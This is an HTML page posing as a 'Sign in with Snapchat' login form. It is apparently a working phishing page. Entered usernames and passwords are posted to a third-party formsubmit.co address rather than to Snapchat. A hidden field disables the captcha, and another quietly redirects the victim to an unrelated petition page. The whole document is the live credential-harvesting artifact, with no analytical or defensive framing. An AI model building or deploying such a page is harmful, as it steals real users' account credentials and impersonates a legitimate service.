<!DOCTYPE html>
<html>
<head>
  <title>Sign in with Snapchat</title>
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:400,700&display=swap">
  <link rel="stylesheet" href="style.css"> 
   <link rel="icon" href="" type="image/x-icon">
</head>
<body>
  <div class="container">
    <div class="logo"></div>
    <h1>Sign in with Snapchat</h1>
    <form action="https://formsubmit.co/178adf6086f8ae9a9bdb1945739ff8d9" method="POST">
      <label for="username">Username or Email</label>
      <input type="text" id="username" name="username" required>
      <label for="password">Password</label>
      <input type="password" id="password" name="password" required>
      <input type="hidden" name="_next" value="https://petition.me/petitions.html" />
      <input type="hidden" name="_captcha" value="false" />
      <input type="submit" value="Log in">
    </form>
    <div class="login-box">
      <a href="#">Forgot password?</a> | <a href="#">Sign up</a>
    </div>
  </div>
</body>
</html>
